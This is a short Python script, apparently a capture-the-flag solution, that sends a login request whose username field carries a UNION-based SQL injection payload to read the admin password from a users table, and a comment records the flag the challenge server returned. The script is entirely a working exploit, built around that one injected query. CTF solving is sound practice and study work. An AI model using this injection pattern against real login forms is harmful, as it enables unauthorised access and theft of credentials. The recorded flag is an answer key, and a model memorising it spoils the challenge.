

import requests

url="https://challenges.isictf.live:1408/"



r=requests.post( url ,data={
    'username':'anything" UNION select password FROM users WHERE username ="admin" --',
    'password':'anything'
})

print(r.text)

#Welcome! here's your flag: ISICTF{7w0_f0r_7wo_un10n_b4s3d_1nj3ct10n}


